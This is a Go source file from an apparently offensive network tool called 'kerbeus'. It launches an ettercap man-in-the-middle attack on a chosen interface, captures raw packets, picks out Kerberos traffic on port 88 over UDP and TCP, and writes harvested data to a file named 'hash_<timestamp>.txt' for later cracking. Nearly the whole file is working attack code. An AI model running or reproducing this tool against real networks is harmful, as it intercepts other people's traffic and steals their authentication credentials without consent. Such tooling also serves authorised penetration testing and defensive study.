package capture

import (
	"fmt"
	"log"
	"os"
	"os/signal"
	"runtime/debug"
	"syscall"
	"time"

	"github.com/google/gopacket"
	"github.com/google/gopacket/afpacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/tcpassembly"
	"golang.org/x/term"

	"kerbeus/src/ettercap"
	"kerbeus/src/stream"
	"kerbeus/src/udpkerberos"
)

func Start(dev string) error {
	defer func() {
		if r := recover(); r != nil {
			log.Printf("panic recover: %v\n%s", r, debug.Stack())
		}
	}()

	if err := ettercap.Start(dev); err != nil {
		log.Printf("\r⚠️  %v (continuing without MITM)", err)
	}

	filename := fmt.Sprintf("hash_%s.txt", time.Now().Format("2006-01-02_15-04-05"))
	exitCh := make(chan struct{})

	h, err := afpacket.NewTPacket(
		afpacket.OptInterface(dev),
		afpacket.OptFrameSize(1<<16),
		afpacket.OptBlockSize(1<<20),
		afpacket.OptNumBlocks(8),
		afpacket.OptTPacketVersion(afpacket.TPacketVersion3),
		afpacket.OptPollTimeout(500),
	)
	if err != nil {
		return fmt.Errorf("\r\033[Kafpacket failed: %v\nMake sure to run with sudo", err)
	}
	defer h.Close()

	packetSource := gopacket.NewPacketSource(h, layers.LayerTypeEthernet)
	packets := packetSource.Packets()

	streamFactory := stream.NewFactory(filename, exitCh)
	streamPool := tcpassembly.NewStreamPool(streamFactory)
	assembler := tcpassembly.NewAssembler(streamPool)

	go handleUserInput(exitCh)
	go handleSignals(exitCh)

	fmt.Println("\r\033[K🎯 Waiting for Kerberos packets...\r")

	return processPackets(packets, exitCh, assembler, streamFactory)
}

func handleSignals(exitCh chan struct{}) {
	sigCh := make(chan os.Signal, 1)
	signal.Notify(sigCh, syscall.SIGINT, syscall.SIGTERM)
	<-sigCh
	ettercap.Stop()
	close(exitCh)
}

func handleUserInput(exitCh chan struct{}) {
	oldState, err := term.MakeRaw(int(os.Stdin.Fd()))
	if err != nil {
		log.Printf("\r\033[K⚠️  Could not set terminal to raw mode: %v", err)
		return
	}
	defer term.Restore(int(os.Stdin.Fd()), oldState)

	b := make([]byte, 1)
	for {
		_, err := os.Stdin.Read(b)
		if err != nil {
			return
		}
		// Ctrl+C sends byte 3
		if b[0] == 'q' || b[0] == 'Q' || b[0] == 3 {
			ettercap.Stop()
			close(exitCh)
			return
		}
	}
}

func processPackets(packets chan gopacket.Packet, exitCh chan struct{},
	assembler *tcpassembly.Assembler, factory *stream.Factory) error {
	for {
		select {
		case <-exitCh:
			fmt.Print("\r\n✓ Program closed correctly\n\r")
			os.Exit(0)
		case packet, ok := <-packets:
			if !ok {
				return nil
			}

			netL := packet.NetworkLayer()
			if netL == nil {
				continue
			}

			srcIP := netL.NetworkFlow().Src().String()
			dstIP := netL.NetworkFlow().Dst().String()

			if udpL := packet.Layer(layers.LayerTypeUDP); udpL != nil {
				udp := udpL.(*layers.UDP)
				if udp.SrcPort == 88 || udp.DstPort == 88 {
					udpkerberos.Process(udp.Payload, factory, srcIP, dstIP)
				}
			} else if tcpL := packet.Layer(layers.LayerTypeTCP); tcpL != nil {
				tcp := tcpL.(*layers.TCP)
				if tcp.SrcPort == 88 || tcp.DstPort == 88 {
					assembler.AssembleWithTimestamp(netL.NetworkFlow(), tcp, packet.Metadata().Timestamp)
				}
			}
		}
	}
}
